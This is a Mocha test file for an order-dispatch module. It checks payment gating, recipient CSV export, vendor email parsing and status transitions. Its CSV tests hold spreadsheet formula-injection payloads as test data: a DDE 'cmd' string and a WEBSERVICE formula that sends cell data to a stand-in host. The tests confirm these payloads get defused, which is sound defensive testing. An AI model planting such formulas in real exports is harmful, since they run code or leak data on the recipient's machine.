import { describe, it } from 'mocha'
import { strict as assert } from 'assert'
import {
  canDispatch,
  buildRecipientCsv,
  vendorContactEmail,
  applyDispatchTransition,
} from '../../lib/fulfillment/dispatch-core'

describe('canDispatch', () => {
  const base = {
    id: 'o1',
    status: 'processing',
    payment_status: 'captured',
    stripe_payment_intent_id: 'pi_1',
    record_count: 250,
  }

  it('allows a captured, processing order', () => {
    assert.deepEqual(canDispatch(base), { ok: true })
  })

  it('refuses to dispatch unpaid work', () => {
    assert.equal(canDispatch({ ...base, payment_status: 'authorized' }).ok, false)
    assert.equal(canDispatch({ ...base, payment_status: null }).ok, false)
  })

  it('rejects orders not in processing', () => {
    assert.equal(canDispatch({ ...base, status: 'submitted' }).ok, false)
    assert.equal(canDispatch({ ...base, status: 'shipped' }).ok, false)
    assert.equal(canDispatch({ ...base, status: 'draft' }).ok, false)
  })

  it('explains why it refused', () => {
    const r = canDispatch({ ...base, payment_status: 'authorized' })
    assert.equal(r.ok, false)
    if (!r.ok) assert.ok(r.reason.length > 0)
  })
})

describe('buildRecipientCsv', () => {
  it('emits the vendor column contract with escaping', () => {
    const csv = buildRecipientCsv([
      {
        first_name: 'Ann',
        last_name: "O'Hara",
        address_line_1: '1 Main St, Apt 2',
        address_line_2: '',
        city: 'Tampa',
        state: 'FL',
        zip_code: '33601',
        company: 'Acme "Co"',
        email: 'a@x.com',
        phone: '5551234567',
      },
    ])
    const lines = csv.trim().split('\n')
    assert.equal(
      lines[0],
      'Record_ID,First_Name,Last_Name,Address_1,Address_2,City,State,Zip_Code,Company,Email,Phone'
    )
    assert.ok(lines[1].includes('"1 Main St, Apt 2"'))
    assert.ok(lines[1].includes('"Acme ""Co"""'))
    assert.ok(lines[1].startsWith('1,'))
  })

  it('numbers records sequentially and tolerates missing fields', () => {
    const csv = buildRecipientCsv([{ first_name: 'A' }, { first_name: 'B' }])
    const lines = csv.trim().split('\n')
    assert.equal(lines.length, 3)
    assert.ok(lines[1].startsWith('1,A,'))
    assert.ok(lines[2].startsWith('2,B,'))
    assert.ok(!lines[1].includes('undefined'))
  })

  it('emits a header-only file for an empty list', () => {
    assert.equal(buildRecipientCsv([]).trim().split('\n').length, 1)
  })

  // CWE-1236. Recipient fields are customer-supplied and the vendor opens this
  // file in Excel, so a formula here executes on their machine.
  it('neutralizes every spreadsheet formula prefix', () => {
    for (const prefix of ['=', '+', '-', '@', '\t', '\r']) {
      const csv = buildRecipientCsv([{ first_name: `${prefix}cmd|'/C calc'!A0` }])
      const row = csv.trim().split('\n')[1]
      assert.ok(
        row.includes(`'${prefix}`),
        `prefix ${JSON.stringify(prefix)} was not quoted: ${row}`
      )
      assert.ok(!/(^|,)[=+\-@]/.test(row), `formula still starts a cell: ${row}`)
    }
  })

  it('keeps the payload intact while defusing it', () => {
    const csv = buildRecipientCsv([
      { first_name: '=WEBSERVICE("http://evil.test/?d="&B2)', last_name: 'Ok' },
    ])
    const row = csv.trim().split('\n')[1]
    // Quoted because of the embedded comma-free quotes, apostrophe-prefixed
    // because of the '='. Nothing is dropped — we still mail the right name.
    assert.ok(row.includes('WEBSERVICE'))
    assert.ok(row.includes(`'=`))
    assert.ok(row.includes('Ok'))
  })

  it('leaves ordinary values untouched', () => {
    const csv = buildRecipientCsv([{ first_name: 'Ann', zip_code: '33601' }])
    const row = csv.trim().split('\n')[1]
    assert.ok(row.startsWith('1,Ann,'))
    assert.ok(!row.includes("'"))
  })
})

describe('vendorContactEmail', () => {
  it('reads email out of contact_info jsonb', () => {
    assert.equal(vendorContactEmail({ email: 'print@vendor.com', phone: 'x' }), 'print@vendor.com')
  })

  it('null for missing or malformed contact info', () => {
    assert.equal(vendorContactEmail(null), null)
    assert.equal(vendorContactEmail(undefined), null)
    assert.equal(vendorContactEmail({ phone: 'x' }), null)
    assert.equal(vendorContactEmail({ email: 'not-an-email' }), null)
    assert.equal(vendorContactEmail('print@vendor.com'), null)
  })
})

describe('applyDispatchTransition', () => {
  it('sent -> accepted keeps the order where it is', () => {
    assert.deepEqual(applyDispatchTransition('sent', 'accepted'), { ok: true, orderStatus: null })
  })

  it('in_production -> shipped advances the order to shipped', () => {
    assert.deepEqual(applyDispatchTransition('in_production', 'shipped'), {
      ok: true,
      orderStatus: 'shipped',
    })
  })

  it('shipped -> delivered completes the order', () => {
    assert.deepEqual(applyDispatchTransition('shipped', 'delivered'), {
      ok: true,
      orderStatus: 'completed',
    })
  })

  it('allows skipping intermediate stages forward', () => {
    assert.deepEqual(applyDispatchTransition('sent', 'shipped'), {
      ok: true,
      orderStatus: 'shipped',
    })
  })

  it('rejects backwards and same-state transitions', () => {
    assert.equal(applyDispatchTransition('shipped', 'accepted').ok, false)
    assert.equal(applyDispatchTransition('delivered', 'shipped').ok, false)
    assert.equal(applyDispatchTransition('accepted', 'accepted').ok, false)
  })

  it('failed is always reachable and does not move the order', () => {
    assert.deepEqual(applyDispatchTransition('sent', 'failed'), { ok: true, orderStatus: null })
    assert.deepEqual(applyDispatchTransition('shipped', 'failed'), { ok: true, orderStatus: null })
  })
})
